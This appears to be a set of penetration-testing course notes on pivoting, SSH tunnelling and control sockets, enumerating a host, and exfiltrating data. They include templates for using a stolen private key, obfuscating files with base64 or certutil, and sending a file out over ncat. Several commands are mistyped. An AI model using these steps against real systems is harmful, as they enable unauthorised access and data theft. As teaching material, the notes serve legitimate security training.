# Pivoting & Redirection
During the lesson we will review the following topics:
    Control Sockets
    Enumeration
    Exfiltration

# SSH Overview
## Basic Characteristics
    Access remote systems using an SSH server as a proxy
    Securely transfer files
    Execute commands on a remote system
    VPN using the SSH protocol as a transport
    Forwarding the X Window System display to the client system

# Linux Targets
## Local Port Forward
-L <USER PORT ON LOCAL>:TARGETHOST:TARGETPORT

## Remote Port Forward
ssh USER@<PIVOT IP> -R <REMOTE PORT ON PIVOT>:TARGETHOST:TARGETPORT

# Windows Targets
## Port Proxying
netsh interface portproxy add v4tov4 listenport=<LocalPort> listenaddress=<LocalIP> connectport=<TargetPort> connectaddress=<TargetIP> protocol=tcp
netsh interface portproxy show all
netsh interface portproxy delete v4tov4 listenport=<LocalPort>
netsh interface portproxy reset

# SSH Keys
    SSH keys are asymetric(public/private) key pairs that can be used to authenticate a user to a system in combination with or to replace the use of a password
    If you are able to find a users private ssh key it can potentially be used to gain access to other systems

## Using Stolen SSH Keys
### Bring private key to your own box
### On your box:
chmod 600 /home/student/stolenkey
ssh -i /home/student/stolenkey jane@1.2.3.4
#### ssh as the user who is the original key owner

# Control Sockets
## Benefits Provided Include:
    Multiplexing
    Data exfiltration
    Less logging

# Control Sockets (config)
## Two main ways to configure:
### Command Line Method
ssh -M -S /tmp/s root@<IP ADDRESS> <TUNNEL COMMANDS -R or -L>

ssh -S /tmp/s x@x
scp -o 'ControlPath=/tmp/s' x@x:<Path>

### Configuration File Method (~/.ssh/ssh_config)
HostName *
ControlPath ~/.ssh/controlmasters/%r@%h:%p
ControlMaster auto
ControlPersist 10m

# Local Host Enumeration

# User Enumeration
    Why is this important?
    What does it provide?

## Windows
net user

## Linux
cat /etc/passwd
SUDO -L
CAT /ETC/HOSTS
# Process Enumeration
    Why is this important?
    What does it provide?

## Windows
tasklist /v
get ciminstance
htop
top

## Linux
ps -elf

# Service Enumeration
    Why is this important?
    What does it provide?

## Windows
tasklist /svc

## Linux
chkconfig                   # SysV
systemctl --type=service    # SystemD
crontab

# Network Connection Enumeration
    Why is this important?
    What does it provide?

## Windows
ipconfig /all

## Linux
ifconfig -a      # SysV (deprecated)
ip a             # SystemD

# Data Exfiltration

## Session Transcript
 ssh <user>@<host> | tee

## Obfuscation (Windows)
type <file> | %{$_ -replace 'a','b' -replace 'b','c' -replace 'c','d'} > translated.out
certutil -encode <file> encoded.b64

## Obfuscation (Linux)
cat <file> | tr 'a-zA-Z0-9' 'b-zA-Z0-9a' > shifted.txt
cat <file>> | base64

## Encrypted Transport
scp <source> <destination>
ncat --ssl <ip> <port> < <file>
    
